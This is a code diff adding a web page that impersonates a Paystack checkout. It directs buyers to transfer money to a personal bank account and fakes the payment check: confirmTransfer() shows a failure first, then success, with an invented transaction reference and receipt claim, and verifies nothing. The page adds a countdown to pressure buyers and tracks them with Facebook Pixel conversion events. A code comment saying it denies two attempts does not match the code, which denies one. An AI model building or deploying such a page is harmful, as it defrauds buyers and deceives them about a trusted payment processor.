+                                <svg class="ps-copy-icon" onclick="copyAmt(this)" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                            </div>
+                        </div>
+                        <!-- Expires -->
+                        <div class="ps-expires" id="expiresRow">
+                            Expires in <strong id="timerDisplay">30:00</strong>
+                        </div>
+                        <div class="ps-progress-bar">
+                            <div class="ps-progress-bar-inner"></div>
+                        </div>
+                    </div>
+
+                    <button class="ps-btn-outline hidden" id="confirmBtn" onclick="confirmTransfer()">I've sent the money</button>
+                </div>
+
+                <!-- Screen: Verifying -->
+                <div class="ps-screen" id="screenVerifying">
+                    <div class="ps-verifying">
+                        <div class="ps-spinner"></div>
+                        <h3>Verifying transfer</h3>
+                        <p>Hold on while we confirm your payment...</p>
+                    </div>
+                </div>
+
+                <!-- Screen: Failed -->
+                <div class="ps-screen" id="screenFailed">
+                    <div class="ps-failed">
+                        <div class="ps-fail-circle">
+                            <svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+                        </div>
+                        <h3>Transfer not confirmed</h3>
+                        <p id="failedMsg">We haven't received your transfer yet. Please ensure you've completed the transfer and try again.</p>
+                        <button class="ps-btn-retry" id="retryBtn" onclick="retryTransfer()">Try again</button>
+                    </div>
+                </div>
+
+                <!-- Screen: Success -->
+                <div class="ps-screen" id="screenSuccess">
+                    <div class="ps-success">
+                        <div class="ps-check-circle">
+                            <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                        </div>
+                        <h3>Payment Successful</h3>
+                        <div class="ps-success-amount"><span class="cur" id="successCur">NGN</span> <span id="successNum">6,500</span></div>
+                        <p>A receipt has been sent to <strong id="successEmail">customer@email.com</strong></p>
+                        <div class="ps-ref" id="successRef">REF: PSK-TXN-2026XXXXXX</div>
+                        <a class="ps-btn ps-btn-green ps-success-btn hidden" id="successBtn" href="#" target="_blank">Continue</a>
+                    </div>
+                </div>
+
+            </div>
+
+            <!-- FOOTER -->
+            <div class="ps-footer">
+                <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                <span>Secured by</span>
+                <strong>PAYSTACK</strong>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<script>
+// ===== CONFIG =====
+const CONFIG = {
+    merchantName: 'Paystack Checkout',
+    amount: 6500,
+    currency: 'NGN',
+    bankName: 'Fidelity Bank',
+    accountNumber: '4567379730',
+    accountName: 'BASSEY GODSWILL',
+    timerMinutes: 30,
+    verifyDelay: 3500,
+
+    // Facebook Pixel
+    fbPixelId: '1888592258325341',
+
+
+    // Página de obrigado (redirect após sucesso)
+    thankYouUrl: 'thanks-you.html',        // URL da página de obrigado (local)
+
+    // Botão de próximos passos (na página de obrigado)
+    successBtnText: 'Continue',          // Texto do botão
+    successBtnUrl: '',                   // URL de redirect (vazio = sem botão)
+};
+
+let timerInterval = null;
+let remaining = CONFIG.timerMinutes * 60;
+let isMobile = window.innerWidth <= 520;
+let attempts = 0;
+let btnShowTimeout = null;
+let cooldownTimeout = null;
+const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
+
+window.addEventListener('resize', () => { isMobile = window.innerWidth <= 520; });
+
+// ===== MODAL OPEN / CLOSE =====
+function openModal() {
+    const email = qs('#userEmail').value.trim();
+    const firstName = qs('#firstName').value.trim();
+    const lastName = qs('#lastName').value.trim();
+
+    if (!firstName || !lastName) {
+        alert('Please enter your first and last name.');
+        return;
+    }
+    if (!email || !email.includes('@')) {
+        alert('Please enter a valid email address.');
+        return;
+    }
+
+    CONFIG._email = email;
+    CONFIG._name = firstName + ' ' + lastName;
+
+    qs('#headerEmail').textContent = email;
+    qs('#overlay').classList.add('open');
+    document.body.style.overflow = 'hidden';
+
+    trackEvent('InitiateCheckout', {
+        value: CONFIG.amount,
+        currency: CONFIG.currency,
+        content_name: CONFIG.merchantName
+    });
+
+    if (isMobile) {
+        show('screenMethods');
+    } else {
+        showTransfer();
+    }
+}
+
+function closeModal() {
+    stopTimer();
+    clearTimeout(btnShowTimeout);
+    clearTimeout(cooldownTimeout);
+    qs('#overlay').classList.remove('open');
+    document.body.style.overflow = '';
+    resetState();
+}
+
+function resetState() {
+    remaining = CONFIG.timerMinutes * 60;
+    attempts = 0;
+    updateTimer();
+    qs('#sidebar').style.display = '';
+    qs('#confirmBtn').classList.add('hidden');
+    show('screenMethods');
+}
+
+// Close modal on overlay click (outside the checkout box)
+qs('#overlay').addEventListener('click', function(e) {
+    if (e.target === this) closeModal();
+});
+
+// ===== CURRENCY CONVERSION =====
+let usdRate = null; // NGN per 1 USD
+
+async function fetchUsdRate() {
+    try {
+        const res = await fetch('https://open.er-api.com/v6/latest/USD');
+        const json = await res.json();
+        if (json.result === 'success' && json.rates && json.rates.NGN) {
+            usdRate = json.rates.NGN;
+            console.log('[FX] 1 USD =', usdRate, 'NGN');
+        }
+    } catch (e) {
+        console.warn('[FX] Failed to fetch rate, using fallback');
+        usdRate = 1500; // fallback
+    }
+}
+
+function toUsd(ngnAmount) {
+    if (!usdRate) return ngnAmount; // fallback: send as-is
+    return Math.round((ngnAmount / usdRate) * 100) / 100;
+}
+
+// ===== FACEBOOK PIXEL =====
+function initPixel() {
+    if (!CONFIG.fbPixelId || typeof fbq === 'undefined') return;
+    fbq('init', CONFIG.fbPixelId);
+    fbq('track', 'PageView');
+}
+
+function trackEvent(event, data) {
+    if (!CONFIG.fbPixelId) return;
+    if (typeof fbq !== 'function') { console.warn('[Pixel] fbq not loaded'); return; }
+
+    // Prevent duplicate events within same session
+    const key = 'ps_evt_' + sessionId + '_' + event;
+    if (sessionStorage.getItem(key)) return;
+    sessionStorage.setItem(key, '1');
+
+    // Convert to USD for Meta
+    if (data && data.currency === 'NGN' && usdRate) {
+        data.value = toUsd(data.value);
+        data.currency = 'USD';
+    }
+
+    console.log('[Pixel] Firing:', event, data);
+    if (data) {
+        fbq('track', event, data);
+    } else {
+        fbq('track', event);
+    }
+}
+
+// ===== INIT =====
+function init() {
+    const amt = fmtAmt(CONFIG.amount);
+    const full = CONFIG.currency + ' ' + amt;
+
+    // Update checkout page amounts
+    qs('#payBtnAmount').textContent = full;
+    qs('#amountDisplay').value = amt;
+
+    qs('#headerAmount').textContent = full;
+    qs('#transferAmt').textContent = full;
+    qs('#transferCardAmt').textContent = full;
+    qs('#methodFooterAmount').textContent = full;
+    qs('#successCur').textContent = CONFIG.currency;
+    qs('#successNum').textContent = amt;
+    qs('#bankName').textContent = CONFIG.bankName;
+    qs('#acctNum').textContent = CONFIG.accountNumber;
+    qs('#acctHolder').textContent = CONFIG.accountName;
+    qs('#acctName').textContent = CONFIG.merchantName.toUpperCase();
+
+    // Success button
+    if (CONFIG.successBtnUrl) {
+        const btn = qs('#successBtn');
+        btn.textContent = CONFIG.successBtnText;
+        btn.href = CONFIG.successBtnUrl;
+        btn.classList.remove('hidden');
+    }
+
+    // Facebook Pixel + USD rate
+    initPixel();
+    fetchUsdRate();
+
+}
+
+function fmtAmt(n) {
+    return n.toLocaleString('en-NG', { minimumFractionDigits: 0, maximumFractionDigits: 0 });
+}
+
+function qs(sel) { return document.querySelector(sel); }
+
+// ===== SCREENS =====
+function show(id) {
+    document.querySelectorAll('.ps-screen').forEach(s => s.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+}
+
+
+function showTransfer() {
+    show('screenTransfer');
+    startTimer();
+
+    // Hide button initially, show after 60 seconds
+    const btn = qs('#confirmBtn');
+    btn.classList.add('hidden');
+    clearTimeout(btnShowTimeout);
+    btnShowTimeout = setTimeout(() => {
+        btn.classList.remove('hidden');
+    }, 60000); // 60 seconds
+}
+
+function goToMethods() {
+    stopTimer();
+    if (isMobile) {
+        show('screenMethods');
+    } else {
+        show('screenEmail');
+    }
+}
+
+function confirmTransfer() {
+    attempts++;
+    qs('#sidebar').style.display = 'none';
+    qs('#confirmBtn').classList.add('hidden');
+    show('screenVerifying');
+
+    if (attempts < 2) {
+        // Deny on 1st and 2nd attempts
+        setTimeout(() => {
+            show('screenFailed');
+        }, CONFIG.verifyDelay);
+    } else {
+        // Approve on 3rd attempt
+        stopTimer();
+        setTimeout(() => {
+            qs('#successEmail').textContent = CONFIG._email || '';
+            qs('#successRef').textContent = 'REF: PSK-TXN-' + genRef();
+            show('screenSuccess');
+            // Redirect to thank you page after short delay
+            if (CONFIG.thankYouUrl) {
+                setTimeout(() => {
+                    const params = new URLSearchParams();
+                    params.set('amount', CONFIG.amount);
+                    params.set('currency', CONFIG.currency);
+                    params.set('email', CONFIG._email || '');
+                    params.set('ref', qs('#successRef').textContent);
+                    if (usdRate) params.set('fxrate', usdRate);
+                    window.location.href = CONFIG.thankYouUrl + '?' + params.toString();
+                }, 2000);
+            }
+        }, CONFIG.verifyDelay);
+    }
+}
+
+function retryTransfer() {
+    qs('#sidebar').style.display = '';
+    show('screenTransfer');
+
+    // Hide the button, show after 30-second cooldown
+    const btn = qs('#confirmBtn');
+    btn.classList.add('hidden');
+    clearTimeout(cooldownTimeout);
+    cooldownTimeout = setTimeout(() => {
+        btn.classList.remove('hidden');
+    }, 30000); // 30 seconds
+}
+
+// ===== TIMER =====
+function startTimer() {
+    remaining = CONFIG.timerMinutes * 60;
+    updateTimer();
+    timerInterval = setInterval(() => {
+        remaining--;
+        updateTimer();
+        if (remaining <= 300) qs('#expiresRow').classList.add('urgent');
+        if (remaining <= 0) {
+            stopTimer();
+            alert('Transfer expired. Please try again.');
+            goToMethods();
+        }
+    }, 1000);
+}
+
+function stopTimer() {
+    clearInterval(timerInterval);
+    timerInterval = null;
+    qs('#expiresRow').classList.remove('urgent');
+}
+
+function updateTimer() {
+    const m = Math.floor(remaining / 60);
+    const s = remaining % 60;
+    qs('#timerDisplay').textContent = `${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+}
+
+// ===== COPY =====
+function copyToClipboard(text, iconEl) {
+    navigator.clipboard.writeText(text).then(() => {
+        iconEl.classList.add('copied');
+        setTimeout(() => iconEl.classList.remove('copied'), 2000);
+    }).catch(() => {
+        const ta = document.createElement('textarea');
+        ta.value = text;
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand('copy');
+        document.body.removeChild(ta);
+        iconEl.classList.add('copied');
+        setTimeout(() => iconEl.classList.remove('copied'), 2000);
+    });
+}
+
+function copyAcct(el) {
+    copyToClipboard(CONFIG.accountNumber, el);
+}
+
+function copyAmt(el) {
+    copyToClipboard(CONFIG.currency + ' ' + fmtAmt(CONFIG.amount), el);
+}
+
+// ===== UTILS =====
+function genRef() {
+    return new Date().getFullYear() + Math.random().toString(36).substring(2, 8).toUpperCase();
+}
+
+init();
+</script>
+
+
+</body></html>
